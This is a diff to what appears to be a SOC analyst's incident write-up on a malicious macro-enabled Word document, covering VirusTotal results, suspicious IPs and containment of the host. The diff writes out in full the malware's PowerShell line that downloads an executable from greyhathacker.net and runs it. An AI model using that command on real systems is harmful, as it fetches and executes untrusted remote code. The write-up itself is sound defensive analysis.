@@ -35,6 +35,8 @@ The objective was to:
 
 The alert was triggered by the execution of a macro-enabled Word document (`.docm`) — a common attack vector for malware.
 
+<img width="2108" height="574" alt="virutotal" src="https://github.com/user-attachments/assets/0748f85c-4e38-44ec-8938-000f849a59d8" />
+
 To begin the analysis, I looked up the file hash on **VirusTotal**. It was flagged as malicious by **33 out of 66 vendors**, indicating strong suspicion. Upon re-analysis, I uncovered the following:
 
 > **Behavior Summary:**
@@ -75,7 +77,7 @@ From the playbook, the first action was to verify if the malware had already bee
 * **Command:**
 
 ```powershell
-(New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker...')
+ (New-Object System.Net.WebClient).DownloadFile('http://www.greyhathacker.net/tools/messbox.exe','mess.exe');Start-Process 'mess.exe')
 ```
 
 * **Process:** `powershell.exe`
@@ -98,10 +100,10 @@ From the playbook, the first action was to verify if the malware had already bee
 * **Result:** 404 (File Not Found)
 * **Implication:** Payload delivery failed — likely due to a downed server, not a safe system
 
-### ✅ 5. **Historical Behavior (Feb 27)**
+### ✅ 5. **Suspicious Connections**
 
-* **Destination IP:** `52.85.96.93:443`
-* Suspicious prior connection, potential **C2 or data exfiltration**
+* **Destination IPs:** `**52.85.96.93**, **35.186.224.25**, and **31.13.88.174**`
+* Suspicious connections, potential **C2 or data exfiltration**
 
 ---
 
@@ -136,10 +138,12 @@ During log review, I identified suspicious outbound connections to **known malic
 - **52.85.96.93**, **35.186.224.25**, and **31.13.88.174** (historically linked to malware distribution).  
 - These IPs were flagged by multiple engines for hosting:  
   - Malicious executables (`UR Browser Setup`, `26j64bdjd2.exe`, `nhjgawgl.exe`).  
-  - Compromised ELF binaries (Linux malware) and fake installers (`SpotifyInstaller`).  
+  - Compromised ELF binaries (Linux malware) and fake installers (`SpotifyInstaller`).
+<img width="1726" height="433" alt="6" src="https://github.com/user-attachments/assets/1de74f24-8195-463a-b3f6-6111d3daf980" />
+</br>
+<img width="1812" height="547" alt="7" src="https://github.com/user-attachments/assets/972820c4-8a57-49e4-874e-fd36875fa119" />
 
 The endpoint’s traffic to these IPs suggests **potential C2 communication or payload retrieval**, aligning with the malware’s earlier behavior (e.g., PowerShell downloads, VM evasion).  
-
 
 ✅ **Conclusion:** This endpoint did indeed reach a known malicious IP — a major indicator of compromise.
 
@@ -148,6 +152,8 @@ The endpoint’s traffic to these IPs suggests **potential C2 communication or p
 ## 🛡️ Step 5: Containment
 
 Given the evidence, I immediately **contained the host** from the **EDR dashboard**.
+
+<img width="1511" height="565" alt="contained" src="https://github.com/user-attachments/assets/453076e1-5cf5-4a25-a2a0-79e85c8e4244" />
 
 > 🔒 **Why this matters:**
 > Containment stops lateral movement, prevents further C2 communication, and isolates the threat — crucial when malware attempts to drop payloads or escalate privileges.
@@ -171,6 +177,8 @@ Given the evidence, I immediately **contained the host** from the **EDR dashboar
 ## 🧾 Step 7: Analyst Comment Snippet
 
 > *"Malicious macro executed hidden PowerShell commands to contact a suspicious external domain (`greyhathacker.net`) with intent to download a payload. Endpoint also communicated with previously flagged malicious IPs. The attack was halted before full execution, but indicators confirm malicious intent. Host was contained. Analysis closed as **True Positive**."*
+
+<img width="1284" height="482" alt="true positive" src="https://github.com/user-attachments/assets/97530e25-64db-484b-af01-a45a354bc65a" />
 
 ---
 
